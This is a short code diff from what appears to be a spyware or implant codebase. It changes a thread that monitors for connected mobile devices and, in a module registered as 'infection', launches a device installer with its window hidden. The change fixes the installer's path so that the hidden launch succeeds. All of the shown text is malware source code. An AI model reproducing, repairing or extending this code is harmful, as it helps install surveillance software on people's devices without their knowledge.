@@ -1135,6 +1135,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 {
 #ifndef FAKE_MOBILE_INFECTION
 	LOOP {
+		char bb_path[MAX_PATH];
 		WCHAR mmc_path[MAX_PATH];
 		
 		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
@@ -1157,7 +1158,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 			si.cb = sizeof(si);
  			si.wShowWindow = SW_HIDE;
 			si.dwFlags = STARTF_USESHOWWINDOW;
-			HM_CreateProcess(BB_INSTALL_NAME1, 0, &si, &pi, 0);
+			HM_CreateProcess(HM_CompletePath(BB_INSTALL_NAME1, bb_path), 0, &si, &pi, 0);
 
 			if (pi.dwProcessId) 
 				SM_AddExecutedProcess(pi.dwProcessId);
@@ -1269,3 +1270,4 @@ void PM_PDAAgentRegister()
 {
 	AM_MonitorRegister(L"infection", PM_PDAAGENT, NULL, (BYTE *)PM_PDAAgentStartStop, (BYTE *)PM_PDAAgentInit, NULL);
 }
+
